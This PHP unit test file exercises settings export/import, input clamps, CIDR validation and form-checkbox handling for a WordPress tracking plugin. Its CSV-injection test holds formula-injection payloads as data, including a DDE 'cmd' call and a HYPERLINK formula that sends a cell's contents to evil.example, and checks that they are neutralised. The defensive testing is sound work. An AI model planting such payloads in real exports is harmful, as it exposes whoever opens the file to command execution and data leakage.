<?php
/**
 * Tests for TrackWP_Settings::export_settings() / import_settings() (1.10.1).
 *
 * Covers:
 * - The secrets round-trip through export_settings() -> import_settings()
 *   without double base64 encoding (the $presanitized flag fix).
 * - trackwp_woocommerce is included in export and restored on import.
 * - Cookie-lifetime clamps in sanitize_consent()/sanitize_advanced() (K7).
 * - consent_log_retention_months clamp (6-60).
 * - trusted_proxies CIDR validation.
 * - gtm_vendors whitelist + custom rows (now stored under trackwp_consent,
 *   per the coordinator's "Fastlagte navne og placeringer" note).
 * - show_reject_button no longer exists in the sanitized output.
 *
 * The round-trip test uses TrackWP_Settings::export_settings() itself as the
 * producer of the "exported JSON" fixture — not a hand-built array — so the
 * test exercises the real double-encoding bug surface.
 */

class TrackWP_Settings_Import_Test extends WP_UnitTestCase {

    public function tear_down() {
        delete_option( 'trackwp_platforms' );
        delete_option( 'trackwp_advanced' );
        delete_option( 'trackwp_events' );
        delete_option( 'trackwp_consent' );
        delete_option( 'trackwp_cookie_declarations' );
        delete_option( 'trackwp_woocommerce' );
        delete_option( 'trackwp_blocker' );
        parent::tear_down();
    }

    /**
     * Producer: TrackWP_Settings::export_settings() (includes/class-trackwp-settings.php).
     * This reproduces the original bug exactly: export stores secrets in
     * their already-encoded (base64) form, and a naive import that runs them
     * back through sanitize_platforms()'s TrackWP_Hash::encode() would
     * double-encode them.
     */
    public function test_secret_round_trips_without_double_encoding() {
        $settings = new TrackWP_Settings();

        // Simulate saving a real secret via the admin form once.
        $saved = $settings->sanitize_platforms( array(
            'ga4_measurement_id' => 'G-ABC123',
            'ga4_api_secret'     => 'top-secret-value',
        ) );
        update_option( 'trackwp_platforms', $saved );

        $decoded_before = TrackWP_Hash::decode( $saved['ga4_api_secret'] );
        $this->assertSame( 'top-secret-value', $decoded_before );

        // Export (the real producer) — secrets are kept in stored (base64) form.
        $exported = TrackWP_Settings::export_settings( true );
        $this->assertSame( $saved['ga4_api_secret'], $exported['platforms']['ga4_api_secret'] );

        // Wipe the option, then import the exported payload back in.
        delete_option( 'trackwp_platforms' );
        $result = TrackWP_Settings::import_settings( $exported );
        $this->assertTrue( $result );

        $reimported = get_option( 'trackwp_platforms' );

        // The bug: without the $presanitized flag, this would be
        // base64(base64('top-secret-value')) and decode() would return the
        // still-encoded string, not the original secret.
        $this->assertSame( $saved['ga4_api_secret'], $reimported['ga4_api_secret'] );
        $this->assertSame( 'top-secret-value', TrackWP_Hash::decode( $reimported['ga4_api_secret'] ) );
    }

    public function test_import_settings_restores_woocommerce_option() {
        if ( ! class_exists( 'TrackWP_WooCommerce' ) ) {
            $this->markTestSkipped( 'WooCommerce class not loaded.' );
        }

        update_option( 'trackwp_woocommerce', array(
            'enabled'     => true,
            'value_basis' => 'ex_tax',
        ) );

        $exported = TrackWP_Settings::export_settings( false );
        $this->assertArrayHasKey( 'woocommerce', $exported );
        $this->assertTrue( $exported['woocommerce']['enabled'] );

        delete_option( 'trackwp_woocommerce' );

        // import_settings() requires platforms/advanced/events/consent too.
        $exported['platforms'] = array();
        $exported['advanced']  = array();
        $exported['events']    = array();
        $exported['consent']   = array();

        $result = TrackWP_Settings::import_settings( $exported );
        $this->assertTrue( $result );

        $restored = get_option( 'trackwp_woocommerce' );
        $this->assertTrue( $restored['enabled'] );
        $this->assertSame( 'ex_tax', $restored['value_basis'] );
    }

    public function test_sanitize_consent_clamps_cookie_lifetime_to_12_months() {
        $settings = new TrackWP_Settings();

        $out = $settings->sanitize_consent( array( 'cookie_lifetime_months' => 999 ) );
        $this->assertSame( 12, $out['cookie_lifetime_months'] );

        $out = $settings->sanitize_consent( array( 'cookie_lifetime_months' => 0 ) );
        $this->assertSame( 1, $out['cookie_lifetime_months'] );
    }

    public function test_sanitize_advanced_clamps_cookie_lifetime_to_24_months() {
        $settings = new TrackWP_Settings();

        $out = $settings->sanitize_advanced( array( 'cookie_lifetime_months' => 999 ) );
        $this->assertSame( 24, $out['cookie_lifetime_months'] );
    }

    public function test_sanitize_consent_clamps_consent_log_retention_months() {
        $settings = new TrackWP_Settings();

        $out = $settings->sanitize_consent( array( 'consent_log_retention_months' => 1 ) );
        $this->assertSame( 6, $out['consent_log_retention_months'] );

        $out = $settings->sanitize_consent( array( 'consent_log_retention_months' => 999 ) );
        $this->assertSame( 60, $out['consent_log_retention_months'] );

        $out = $settings->sanitize_consent( array() );
        $this->assertSame( 24, $out['consent_log_retention_months'] );
    }

    public function test_sanitize_consent_drops_show_reject_button() {
        $settings = new TrackWP_Settings();

        $out = $settings->sanitize_consent( array( 'show_reject_button' => '1' ) );
        $this->assertArrayNotHasKey( 'show_reject_button', $out );
    }

    public function test_sanitize_consent_gtm_vendors_whitelist_and_custom_rows() {
        $settings = new TrackWP_Settings();

        if ( ! class_exists( 'TrackWP_Consent_Profile' ) ) {
            $this->markTestSkipped( 'TrackWP_Consent_Profile not loaded.' );
        }

        $out = $settings->sanitize_consent( array(
            'gtm_vendors' => array(
                // "known" is whitelisted against TrackWP_Consent_Profile::vendor_catalog() (W6).
                'known'  => array( 'ga4', 'meta', 'not-a-real-vendor' ),
                // "custom" rows match TrackWP_Consent_Profile::gtm_vendors()'s expected shape.
                'custom' => wp_json_encode( array(
                    array( 'name' => 'Klaviyo', 'provider' => 'Klaviyo Inc.', 'category' => 'marketing' ),
                    array( 'name' => 'HubSpot', 'category' => 'not-a-real-category' ), // invalid category -> falls back to marketing
                    array( 'name' => '' ), // no name -> dropped
                ) ),
            ),
        ) );

        $this->assertSame( array( 'ga4', 'meta' ), $out['gtm_vendors']['known'] );
        $this->assertCount( 2, $out['gtm_vendors']['custom'] );
        $this->assertSame( 'Klaviyo', $out['gtm_vendors']['custom'][0]['name'] );
        $this->assertSame( 'marketing', $out['gtm_vendors']['custom'][0]['category'] );
        $this->assertSame( 'HubSpot', $out['gtm_vendors']['custom'][1]['name'] );
        $this->assertSame( 'marketing', $out['gtm_vendors']['custom'][1]['category'] );
    }

    public function test_sanitize_advanced_trusted_proxies_validates_cidr() {
        $settings = new TrackWP_Settings();

        $out = $settings->sanitize_advanced( array(
            'trusted_proxies' => "10.0.0.0/8\nnot-a-cidr\n192.168.1.1/33\n2400:cb00::/32",
        ) );

        $this->assertSame( array( '10.0.0.0/8', '2400:cb00::/32' ), $out['trusted_proxies'] );
    }

    public function test_get_trusted_proxies_merges_cloudflare_when_enabled() {
        update_option( 'trackwp_advanced', array(
            'trusted_proxies'            => array( '10.0.0.0/8' ),
            'trusted_proxies_cloudflare' => true,
        ) );

        $list = TrackWP_Settings::get_trusted_proxies();
        $this->assertContains( '10.0.0.0/8', $list );
        $this->assertContains( '173.245.48.0/20', $list );
    }

    public function test_sanitize_advanced_default_phone_country_requires_iso2() {
        $settings = new TrackWP_Settings();

        $out = $settings->sanitize_advanced( array( 'default_phone_country' => 'dk' ) );
        $this->assertSame( 'DK', $out['default_phone_country'] );

        $out = $settings->sanitize_advanced( array( 'default_phone_country' => 'Denmark' ) );
        $this->assertSame( '', $out['default_phone_country'] );
    }

    public function test_record_event_hit_forwarded_metric_and_by_event_other_bucket() {
        delete_option( 'trackwp_stats' );
        delete_option( 'trackwp_events' );

        TrackWP_Settings::record_event_hit( 'forwarded', 'page_view' ); // reserved public name — known
        TrackWP_Settings::record_event_hit( 'forwarded', 'some_third_party_event' ); // unknown

        $agg = TrackWP_Settings::aggregate_stats( 1 );
        $this->assertSame( 2, $agg['totals']['forwarded'] );
        $this->assertSame( 1, $agg['by_event']['page_view'] );
        $this->assertSame( 1, $agg['by_event']['_other'] );
    }

    /**
     * Klasse B (review-rettelser 1.10.1): a real browser POST for an
     * unchecked checkbox that has the `<input type="hidden" ... value="0">`
     * fallback (templates/settings-page.php) sends the field as the string
     * "0" — it is NOT absent. Build that exact shape by hand (this IS what a
     * real $_POST looks like for a hidden+checkbox pair, not a stand-in) and
     * confirm every default-true field is turned off correctly, and that a
     * fully-absent key (import/programmatic call, no hidden fallback
     * involved) still gets the documented default.
     */
    public function test_default_true_checkbox_is_false_when_form_sends_zero() {
        $settings = new TrackWP_Settings();

        $out = $settings->sanitize_advanced( array( 'customer_data_sharing' => '0' ) );
        $this->assertFalse( $out['customer_data_sharing'] );

        // Fully absent key (e.g. programmatic call, or an import file predating
        // this option) keeps the documented default.
        $out = $settings->sanitize_advanced( array() );
        $this->assertTrue( $out['customer_data_sharing'] );

        // Checked checkbox: browser sends the hidden "0" first, then the
        // checkbox's "1" overwrites it in $_POST — same key, last value wins.
        $out = $settings->sanitize_advanced( array( 'customer_data_sharing' => '1' ) );
        $this->assertTrue( $out['customer_data_sharing'] );
    }

    /**
     * Every checkbox in settings-page.php must have its hidden-zero fallback
     * immediately before it (Klasse B), so an unchecked box always survives
     * as "0" in $_POST instead of vanishing from the array entirely.
     */
    public function test_every_checkbox_has_a_preceding_hidden_zero_fallback() {
        $template = file_get_contents( TRACKWP_PLUGIN_DIR . 'templates/settings-page.php' );
        $this->assertNotFalse( $template );
        // 1.11.0: the Blokering tab is a partial included by settings-page.php.
        $partial = file_get_contents( TRACKWP_PLUGIN_DIR . 'templates/partials/admin-blocker.php' );
        $this->assertNotFalse( $partial );
        $template .= $partial;

        preg_match_all( '/<input\s+type="checkbox"[^>]*name="([^"]+)"/s', $template, $matches );
        $checkbox_names = $matches[1];

        foreach ( $checkbox_names as $name ) {
            // Array-style multi-checkboxes (e.g. gtm_vendors[known][]) are a
            // real multi-select: absence from the array IS the correct
            // "unchecked" state, so they are exempt from the hidden-zero rule.
            if ( substr( $name, -2 ) === '[]' ) {
                continue;
            }
            $needle = 'name="' . $name . '" value="0"';
            $this->assertStringContainsString(
                $needle,
                $template,
                "Checkbox '{$name}' has no matching hidden value=\"0\" fallback."
            );
        }

        // Sanity check: the scan itself must have found a non-trivial number
        // of checkboxes, or this test would pass vacuously.
        $this->assertGreaterThan( 20, count( $checkbox_names ) );
    }

    /**
     * Klasse D: sanitize_cidr_list() (via sanitize_advanced()['trusted_proxies'])
     * accepts a bare IPv4/IPv6 address without a prefix and normalises it to
     * a single-host block.
     */
    public function test_trusted_proxies_accepts_plain_ip_without_prefix() {
        $settings = new TrackWP_Settings();

        $out = $settings->sanitize_advanced( array(
            'trusted_proxies' => "203.0.113.5\n2001:db8::1\nnot-an-ip",
        ) );

        $this->assertSame( array( '203.0.113.5/32', '2001:db8::1/128' ), $out['trusted_proxies'] );
    }

    /**
     * Klasse E: CSV/formula injection. Uses the real producer
     * (TrackWP_Settings::csv_safe_cell(), private — invoked via reflection,
     * the same code path handle_consent_export() calls for every cell).
     */
    public function test_csv_safe_cell_neutralises_formula_injection() {
        $method = new ReflectionMethod( 'TrackWP_Settings', 'csv_safe_cell' );
        $method->setAccessible( true );

        $payloads = array(
            '=cmd|\'/c calc\'!A1',
            '+1+1',
            '-2+3',
            '@SUM(A1:A2)',
            "\tevil",
            "\revil",
        );
        foreach ( $payloads as $payload ) {
            $safe = $method->invoke( null, $payload );
            $this->assertSame( "'" . $payload, $safe, "Payload not neutralised: {$payload}" );
        }

        // A realistic attack surface: user_agent is attacker-controlled (the
        // browser sends whatever the request wants) and lands in the export.
        $malicious_user_agent = '=HYPERLINK("http://evil.example/?x="&A1,"click")';
        $safe_ua = $method->invoke( null, $malicious_user_agent );
        $this->assertStringStartsWith( "'=", $safe_ua );

        // Benign values must survive unchanged.
        $this->assertSame( 'Mozilla/5.0', $method->invoke( null, 'Mozilla/5.0' ) );
        $this->assertSame( '', $method->invoke( null, '' ) );
    }

    /**
     * 1.11.0: trackwp_blocker and M1 are exported and restored on import.
     * Producers: TrackWP_Settings::sanitize_blocker() / sanitize_platforms()
     * for the stored options, export_settings() for the file.
     */
    public function test_blocker_and_m1_round_trip_through_export_import() {
        $settings = new TrackWP_Settings();
        $blocker  = $settings->sanitize_blocker( array(
            'mode'           => 'test',
            'rules'          => array( 'host:cdn.leadinfo.net' => array( 'block' => '1', 'category' => 'marketing', 'vendor' => '' ) ),
            'custom_vendors' => array( array( 'name' => 'Partner Ads', 'category' => 'marketing' ) ),
            'exceptions'     => array( 'allow' => array( array( 'type' => 'host', 'value' => 'cdn.example.com' ) ), 'paths' => '/kasse/' ),
            'extra_paths'    => '/kontakt/',
        ) );
        update_option( 'trackwp_blocker', $blocker );
        update_option( 'trackwp_platforms', $settings->sanitize_platforms( array( 'meta_pixel_with_gtm' => '1' ) ) );

        $exported = TrackWP_Settings::export_settings();
        $this->assertSame( $blocker, $exported['blocker'] );

        delete_option( 'trackwp_blocker' );
        delete_option( 'trackwp_platforms' );
        $this->assertTrue( TrackWP_Settings::import_settings( json_decode( wp_json_encode( $exported ), true ) ) );

        $this->assertSame( $blocker, get_option( 'trackwp_blocker' ) );
        $this->assertTrue( get_option( 'trackwp_platforms' )['meta_pixel_with_gtm'] );

        // An import file from before 1.11.0 leaves the option untouched.
        unset( $exported['blocker'] );
        update_option( 'trackwp_blocker', array( 'mode' => 'on' ) );
        TrackWP_Settings::import_settings( $exported );
        $this->assertSame( 'on', get_option( 'trackwp_blocker' )['mode'] );
    }

    /**
     * 1.11.1 KC1/TR7: fb4woo_tracking_off, gtm_datalayer_events, ga4_source
     * and trackwp_blocker['nocache_params'] round-trip through export/import.
     */
    public function test_1_11_1_keys_round_trip_through_export_import() {
        $settings  = new TrackWP_Settings();
        $platforms = $settings->sanitize_platforms( array(
            'fb4woo_tracking_off'  => '1',
            'gtm_enabled'          => '1',
            'gtm_container_id'     => 'GTM-ABCD123',
            'gtm_datalayer_events' => 'on',
            'ga4_source'           => 'split',
        ) );
        update_option( 'trackwp_platforms', $platforms );

        $blocker = $settings->sanitize_blocker( array(
            'nocache_params' => array( 'pacid', 'gclid' ),
        ) );
        update_option( 'trackwp_blocker', $blocker );

        $exported = TrackWP_Settings::export_settings();
        $this->assertTrue( $exported['platforms']['fb4woo_tracking_off'] );
        $this->assertSame( 'on', $exported['platforms']['gtm_datalayer_events'] );
        $this->assertSame( 'split', $exported['platforms']['ga4_source'] );
        $this->assertSame( array( 'pacid', 'gclid' ), $exported['blocker']['nocache_params'] );

        delete_option( 'trackwp_platforms' );
        delete_option( 'trackwp_blocker' );
        $this->assertTrue( TrackWP_Settings::import_settings( json_decode( wp_json_encode( $exported ), true ) ) );

        $restored_platforms = get_option( 'trackwp_platforms' );
        $this->assertTrue( $restored_platforms['fb4woo_tracking_off'] );
        $this->assertSame( 'on', $restored_platforms['gtm_datalayer_events'] );
        $this->assertSame( 'split', $restored_platforms['ga4_source'] );
        $this->assertSame( array( 'pacid', 'gclid' ), get_option( 'trackwp_blocker' )['nocache_params'] );
    }

    /**
     * An import file predating 1.11.1 has no nocache_params key; the
     * sanitizer/defaults fill in the generic click-id list.
     */
    public function test_blocker_defaults_fill_missing_nocache_params_on_old_import() {
        $this->assertSame(
            TrackWP_Settings::default_nocache_params(),
            TrackWP_Settings::blocker_defaults()['nocache_params']
        );
    }
}
